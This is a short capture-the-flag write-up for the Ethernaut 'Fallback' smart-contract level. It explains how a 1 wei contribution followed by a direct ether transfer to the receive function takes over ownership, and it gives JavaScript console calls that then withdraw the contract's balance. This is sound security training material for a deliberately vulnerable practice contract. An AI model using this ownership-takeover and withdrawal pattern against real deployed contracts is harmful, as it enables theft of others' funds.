# [1. Fallback](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

The receive function is flawed, we just need to send some value via contribute and then via receive to change the owner. The contribute requires less than 0.001 ether, and receive expects greater than 0. Here is the plan:

1. We will contribute 1 Wei.
2. We will then send money to the contract address via a fallback function. This can be done by calling a non-existent function in the contract with some ether value.
3. We are now the owner!
4. To deal the final blow, we call the `withdraw` function. By only spending 2 Wei, we got the owners balance :)

```js
// (1) Contribute
await contract.contribute({value: "1"})

// (2) Fallback
await contract.sendTransaction({
  from: player, 
  value: "1", 
  data: undefined // for the fallback
})

// (3) Confirm ownership
await contract.owner()

// (4) Withdraw
await contract.withdraw()
```
